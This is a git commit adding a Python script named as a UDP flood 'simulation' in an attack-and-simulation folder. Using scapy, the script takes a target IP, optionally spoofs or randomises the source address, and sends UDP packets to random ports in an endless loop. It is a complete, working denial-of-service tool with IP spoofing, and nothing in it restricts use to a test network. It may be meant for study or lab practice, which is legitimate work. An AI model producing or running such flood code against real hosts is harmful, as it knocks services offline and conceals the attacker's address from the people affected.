c38e756cda33725143459a51f6969d83667edb4c
Sok Keo Ponleou <ponleousk@gmail.com>
2024-05-26 18:50:54 +0700

    docs: added udpflood simulation

---
+++ attack_and_simulation/udpflood_simulation.py
@@ -0,0 +1,19 @@
+import scapy.all as scp
+
+ip_src = input("Fake Source IP (blank for random IP): ")
+ip_dst = input("Target IP: ")
+
+
+def udpflood_simulation(ip_src, ip_dst):
+    ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)
+    if ip_src:
+        ip_layer.src = ip_src
+
+    udp_layer = scp.UDP(sport=scp.RandShort(), dport=scp.RandShort())
+    packet = ip_layer / udp_layer
+
+    scp.send(packet, loop=1)
+    print(packet)
+
+
+udpflood_simulation(ip_src, ip_dst)
